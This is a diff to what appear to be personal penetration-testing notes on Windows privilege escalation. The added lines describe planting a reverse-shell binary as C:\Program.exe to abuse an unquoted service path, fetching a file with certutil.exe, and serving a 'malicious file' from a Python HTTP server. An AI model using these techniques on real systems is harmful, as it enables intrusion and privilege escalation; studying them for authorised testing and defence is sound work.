@@ -6,6 +6,9 @@ Race condition/Symlink
 Perl or python script
 bad permissions
 
+uncommented path vulnerabilites:
+================================
+place a reverse shell windows binary in the C:\ named Program.exe
 
 windows priv esc:
 =================
@@ -187,6 +190,18 @@ Write-UserAddNSI
 creates an app on the desktop for making a new user. 
 
 
-Windows Questions:
-==================
-can I add Program.exe to get a remote shell to open? if so need example. 
+
+builting windows utility to download file:
+==========================================
+certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+
+setup webserver to download malicious file:
+run the command in the folder you want hosted. 
+python2:
+$ python -m SimpleHTTPServer 8000
+
+python3:
+$ python3 -m http.server 8000
+
+Check:
+browse to localhost:8000
